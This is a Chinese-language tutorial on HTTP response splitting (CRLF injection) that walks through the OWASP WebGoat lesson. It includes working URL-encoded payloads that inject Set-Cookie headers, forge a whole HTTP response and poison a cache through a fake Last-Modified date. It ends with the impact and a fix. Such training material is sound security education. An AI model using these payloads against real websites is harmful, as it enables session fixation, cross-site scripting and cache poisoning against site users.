## HTTP响应拆分
HTTP响应拆分漏洞，也叫`CRLF`注入攻击。利用`CR(%0d)`与`LF(%0a)`等特殊字符串进行攻击。HTTP头由很多被`CRLF`组合分离的行构成，每行的结构都是“键：值”。如果用户输入的值部分注入了`CRLF`字符，它有可能改变的HTTP报头结构。

### 漏洞分析
一般网站会在HTTP头中用`Location: http://example.com`这种方式来进行302跳转，所以我们能控制的内容就是`Location:`后面的XXX某个网址。

所以一个正常的302跳转包是这样：
```http
HTTP/1.1 302 Moved Temporarily 
Date: Mon, 20 Apr 2015 20:23:57 GMT
Content-Type: text/html 
Content-Length: 50 
Connection: close 
Location: http://example.com/WebGoat/attack
```
如果在HTTP头中`Location`它的值变为`http://example.com/WebGoat/attack%0aSet-cookie:PHPSESSID%3Dexample.com`的时候，HTTP返回的头信息会变成下面这样：
```http
HTTP/1.1 302 Moved Temporarily 
Date: Mon, 20 Apr 2015 20:25:17 GMT
Content-Type: text/html 
Content-Length: 50 
Connection: close 
Location: http://example.com/WebGoat/attack
Set-cookie: PHPSESSID=example.com
```
这样就成功的在http头里面注入了新的key/value。
这样也就可以随意的执行xss攻击了。

所以，可以这样构造一个url请求。
```http
http://example.com/WebGoat/attack%0aHTTP/1.1%20200%20OK%0aContent-Type:%20text/html%0aSet-cookie:PHPSESSID%3Dexample.com%0aX-XSS-Protection:%200%0aContent-Length:%2049%0a%0a<html><head><title>Hacked</title></head><body>hacked Q6E79D</body><html>
```

### WebGoat的HTTP Splitting
课程是两个步骤：
第一步，执行拆分攻击。
第二步，缓存污染，要求篡改HTTP头中的Last‐Modified字段。
#### 工具
- [WebScarab](https://www.owasp.org/index.php/WebScarab)
- [PCE](http://yehg.net/encoding) - PHP Charset Encoder/String Encrypter
需要注意，以下操作过程仅适用于Linux 环境。如果您正在使用Windows，请作相关的修
改。Windows 系统中同时使用CR 和LF 两个字符表示新行。Linux 用户只需要使用LF，Mac OS
用户请使用CR。所以如果您正在使用Windows 系统，请将以下操作过程中所有的%0a 需要
替换成%0d%0a（Windows）或%0d（Mac OS）。

第一步拆分攻击，使用PCE对下面的代码进行URL编码
```html
Foobar
Content-Length: 0


HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 47


<html><head><title>Hacked</title></head><body>hacked Q6E79D</body><html>
```
最后得到的结果是：
```html
Foobar%0AContent-Length%3A%200%0A%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2047%0A%0A%0A%3Chtml%3E%3Chead%3E%3Ctitle%3EHacked%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%3Ehacked%20Q6E79D%3C%2Fbody%3E%3Chtml%3E
```
填充到search输入框提交后得到hacked Q6E79D页面信息。然后点击浏览器后退。
第二步缓存污染，修改Last‐Modified字段：
```html
Foobar
Content-Length: 0


HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 47

<html><head><title>Hacked</title></head><body>hacked Q6E79D</body><html>
```
得到的结果是：
```html
Foobar%0AContent-Length%3A%200%0A%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2047%0A%0A%3Chtml%3E%3Chead%3E%3Ctitle%3EHacked%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%3Ehacked%20Q6E79D%3C%2Fbody%3E%3Chtml%3E
```
填充到search输入框提交，完成本次课程的所有操作。

### 危害
攻击者可能注入自定义HTTP头。例如，攻击者可以注入会话cookie或HTML代码。这可能会进行类似的XSS（跨站点脚本）或会话固定漏洞。

### 解决方案：
限制用户输入的CR(%0d)和LF(%0a)，或者对CR(%0d)和LF(%0a)字符正确编码后再输出，以防止注入自定义HTTP头。
